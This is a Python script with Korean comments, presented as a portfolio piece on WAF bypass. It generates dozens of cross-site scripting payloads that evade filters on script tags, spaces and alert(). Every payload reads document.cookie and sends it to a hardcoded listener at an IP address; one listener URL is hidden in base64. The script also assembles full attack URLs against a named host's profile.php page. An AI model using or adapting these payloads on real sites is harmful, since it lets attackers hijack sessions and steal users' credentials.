#!/usr/bin/env python3
"""
Advanced XSS Payloads - 특정 필터 규칙 우회
포트폴리오 목적: 실제 WAF 필터링 우회 기법

필터링 규칙:
1. <script> 태그 완전 차단
2. 태그 소문자화 (ScRiPt -> script)
3. <img , <img> 허용되지만 <img 뒤 공백/문자 차단
4. HTML 엔티티는 태그로 인식 안됨
5. alert(1) 같은 함수도 필터링
"""

import base64
import urllib.parse

class AdvancedPayloadGenerator:
    """고급 필터 우회 페이로드 생성기"""

    def __init__(self, listener_url):
        self.listener_url = listener_url

    def slash_separator(self):
        """
        우회 기법: 슬래시(/)로 공백 대체
        <img/src=x/onerror=...>
        """
        payloads = [
            f'<img/src=x/onerror=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<img/src=x/onerror=fetch("{self.listener_url}?c="+document.cookie)/>',
            f'<img/src/onerror=fetch("{self.listener_url}?c="+document.cookie)>',
        ]
        return payloads

    def tab_separator(self):
        """
        우회 기법: 탭 문자(%09)로 공백 대체
        <img[TAB]src=x[TAB]onerror=...>
        """
        payloads = [
            f'<img\tsrc=x\tonerror=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<img%09src=x%09onerror=fetch("{self.listener_url}?c="+document.cookie)>',
        ]
        return payloads

    def newline_separator(self):
        """
        우회 기법: 줄바꿈(%0A, %0D)으로 공백 대체
        <img[LF]src=x[LF]onerror=...>
        """
        payloads = [
            f'<img\nsrc=x\nonerror=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<img%0Asrc=x%0Aonerror=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<img%0Dsrc=x%0Donerror=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<img%0D%0Asrc=x%0D%0Aonerror=fetch("{self.listener_url}?c="+document.cookie)>',
        ]
        return payloads

    def svg_alternatives(self):
        """
        우회 기법: img 대신 svg 태그 사용
        <svg/onload=...>
        """
        payloads = [
            f'<svg/onload=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<svg\nonload=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<svg%09onload=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<svg/onload=fetch("{self.listener_url}?c="+document.cookie)/>',
        ]
        return payloads

    def other_tags(self):
        """
        우회 기법: 다양한 HTML 태그 활용
        """
        payloads = [
            f'<body/onload=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<iframe/src="javascript:fetch(\'{self.listener_url}?c=\'+document.cookie)">',
            f'<object/data="javascript:fetch(\'{self.listener_url}?c=\'+document.cookie)">',
            f'<embed/src="javascript:fetch(\'{self.listener_url}?c=\'+document.cookie)">',
            f'<input/onfocus=fetch("{self.listener_url}?c="+document.cookie)/autofocus>',
            f'<details/open/ontoggle=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<marquee/onstart=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<video/src/onerror=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<audio/src/onerror=fetch("{self.listener_url}?c="+document.cookie)>',
        ]
        return payloads

    def base64_obfuscation(self):
        """
        우회 기법: Base64로 함수 숨기기
        alert() 필터링 우회
        """
        # fetch 코드를 Base64로 인코딩
        fetch_code = f'fetch("{self.listener_url}?c="+document.cookie)'
        b64 = base64.b64encode(fetch_code.encode()).decode()

        payloads = [
            f'<img/src=x/onerror=eval(atob("{b64}"))>',
            f'<svg/onload=eval(atob("{b64}"))>',
            f'<img\tsrc=x\tonerror=eval(atob("{b64}"))>',
        ]
        return payloads

    def location_based(self):
        """
        우회 기법: fetch 대신 location 사용
        """
        payloads = [
            f'<img/src=x/onerror=location="{self.listener_url}?c="+document.cookie>',
            f'<svg/onload=location="{self.listener_url}?c="+document.cookie>',
            f'<img/src=x/onerror=location.href="{self.listener_url}?c="+document.cookie>',
        ]
        return payloads

    def navigator_sendbeacon(self):
        """
        우회 기법: navigator.sendBeacon 사용
        """
        payloads = [
            f'<img/src=x/onerror=navigator.sendBeacon("{self.listener_url}?c="+document.cookie)>',
            f'<svg/onload=navigator.sendBeacon("{self.listener_url}?c="+document.cookie)>',
        ]
        return payloads

    def xhr_based(self):
        """
        우회 기법: XMLHttpRequest 사용
        """
        payloads = [
            f'<img/src=x/onerror=new(Image).src="{self.listener_url}?c="+document.cookie>',
            f'<svg/onload=new(Image).src="{self.listener_url}?c="+document.cookie>',
        ]
        return payloads

    def mixed_encoding(self):
        """
        우회 기법: 일부 문자만 인코딩
        """
        payloads = [
            # onerror을 일부 인코딩
            f'<img/src=x/on&#101;rror=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<img/src=x/on&#x65;rror=fetch("{self.listener_url}?c="+document.cookie)>',
            # fetch를 일부 인코딩
            f'<img/src=x/onerror=&#102;etch("{self.listener_url}?c="+document.cookie)>',
        ]
        return payloads

    def unicode_escape(self):
        """
        우회 기법: 유니코드 이스케이프
        """
        payloads = [
            f'<img/src=x/onerror=\\u0066\\u0065\\u0074\\u0063\\u0068("{self.listener_url}?c="+document.cookie)>',
            f'<svg/onload=\\u0066\\u0065\\u0074\\u0063\\u0068("{self.listener_url}?c="+document.cookie)>',
        ]
        return payloads

    def eval_alternatives(self):
        """
        우회 기법: eval 대신 다른 실행 방법
        """
        fetch_code = f'fetch("{self.listener_url}?c="+document.cookie)'

        payloads = [
            # Function 생성자
            f'<img/src=x/onerror=Function("{fetch_code}")()>',
            f'<svg/onload=Function("{fetch_code}")()>',
            # setTimeout
            f'<img/src=x/onerror=setTimeout("{fetch_code}",0)>',
            f'<svg/onload=setTimeout("{fetch_code}",0)>',
            # setInterval
            f'<img/src=x/onerror=setInterval("{fetch_code}",999)>',
        ]
        return payloads

    def double_encoding(self):
        """
        우회 기법: 이중 인코딩
        """
        payloads = [
            # URL 인코딩 후 다시 인코딩
            f'<img/src=x/onerror=fetch("{self.listener_url}?c="+document.cookie)>',
        ]
        # URL 인코딩
        encoded = urllib.parse.quote(payloads[0])
        return [encoded]

    def context_specific(self):
        """
        우회 기법: profile.php?full_name= 컨텍스트에 특화된 페이로드
        테스트 결과: &lt;img%20src=x%20onerror&#61alert&#40 까지 작동
        """
        # Base64 인코딩 준비
        fetch_code = f'fetch("{self.listener_url}?c="+document.cookie)'
        b64_code = base64.b64encode(fetch_code.encode()).decode()

        # 공백을 다양한 방법으로 우회
        payloads = [
            # 슬래시 사용
            f'<img/src=x/onerror=fetch("{self.listener_url}?c="+document.cookie)>',

            # 탭 사용 (%09)
            f'<img\tsrc=x\tonerror=fetch("{self.listener_url}?c="+document.cookie)>',

            # 줄바꿈 사용 (%0A)
            f'<img\nsrc=x\nonerror=fetch("{self.listener_url}?c="+document.cookie)>',

            # svg 태그
            f'<svg/onload=fetch("{self.listener_url}?c="+document.cookie)>',

            # 이미지 로드
            f'<img/src=x/onerror=new(Image).src="{self.listener_url}?c="+document.cookie>',

            # location 사용
            f'<img/src=x/onerror=location="{self.listener_url}?c="+document.cookie>',

            # Base64 난독화
            f'<img/src=x/onerror=eval(atob("{b64_code}"))>',
        ]
        return payloads

    def profile_php_specific(self):
        """
        profile.php 전용 최적화 페이로드
        URL 인코딩된 형태로 제공
        """
        base_payloads = [
            # 1. 슬래시 구분자 (가장 유망)
            f'<img/src=x/onerror=fetch("{self.listener_url}?c="+document.cookie)>',

            # 2. svg onload
            f'<svg/onload=fetch("{self.listener_url}?c="+document.cookie)>',

            # 3. 이미지 로드
            f'<img/src=x/onerror=new(Image).src="{self.listener_url}?c="+document.cookie>',

            # 4. location 리다이렉트
            f'<img/src=x/onerror=location="{self.listener_url}?c="+document.cookie>',

            # 5. Base64 (fetch 필터링 우회)
            f'<img/src=x/onerror=eval(atob("ZmV0Y2goImh0dHA6Ly8zLjExMy4yMDEuMjM5Ojg4ODgvc3RlYWw/Yz0iK2RvY3VtZW50LmNvb2tpZSk="))>',

            # 6. details 태그
            f'<details/open/ontoggle=fetch("{self.listener_url}?c="+document.cookie)>',

            # 7. input autofocus
            f'<input/onfocus=fetch("{self.listener_url}?c="+document.cookie)/autofocus>',
        ]

        # URL 인코딩
        encoded_payloads = []
        for payload in base_payloads:
            encoded = urllib.parse.quote(payload)
            encoded_payloads.append({
                'original': payload,
                'url_encoded': encoded,
                'full_url': f'http://3.34.90.201/profile.php?email=test@test&full_name={encoded}'
            })

        return encoded_payloads

    def generate_all_advanced(self):
        """모든 고급 페이로드 생성"""
        all_payloads = {}

        all_payloads['slash_separator'] = self.slash_separator()
        all_payloads['tab_separator'] = self.tab_separator()
        all_payloads['newline_separator'] = self.newline_separator()
        all_payloads['svg_alternatives'] = self.svg_alternatives()
        all_payloads['other_tags'] = self.other_tags()
        all_payloads['base64_obfuscation'] = self.base64_obfuscation()
        all_payloads['location_based'] = self.location_based()
        all_payloads['navigator_sendbeacon'] = self.navigator_sendbeacon()
        all_payloads['xhr_based'] = self.xhr_based()
        all_payloads['mixed_encoding'] = self.mixed_encoding()
        all_payloads['unicode_escape'] = self.unicode_escape()
        all_payloads['eval_alternatives'] = self.eval_alternatives()
        all_payloads['context_specific'] = self.context_specific()

        return all_payloads

if __name__ == '__main__':
    listener = "http://3.113.201.239:8888/steal"
    gen = AdvancedPayloadGenerator(listener)

    print("\n" + "="*80)
    print("🎯 Advanced XSS Payloads - Filter Bypass")
    print("="*80 + "\n")

    print("📋 Filter Rules:")
    print("  1. <script> tag blocked")
    print("  2. Tags converted to lowercase")
    print("  3. <img followed by space/char blocked")
    print("  4. HTML entities not recognized as tags")
    print("  5. alert(1) functions filtered\n")

    print("="*80)
    print("🔥 Profile.php Optimized Payloads (URL Encoded)")
    print("="*80 + "\n")

    profile_payloads = gen.profile_php_specific()
    for idx, p in enumerate(profile_payloads, 1):
        print(f"[Payload {idx}]")
        print(f"Original: {p['original']}")
        print(f"Full URL: {p['full_url']}\n")

    print("="*80)
    print("🎯 All Advanced Payloads by Category")
    print("="*80 + "\n")

    all_payloads = gen.generate_all_advanced()
    for category, payloads in all_payloads.items():
        print(f"\n[{category}]")
        for payload in payloads:
            print(f"  {payload}")
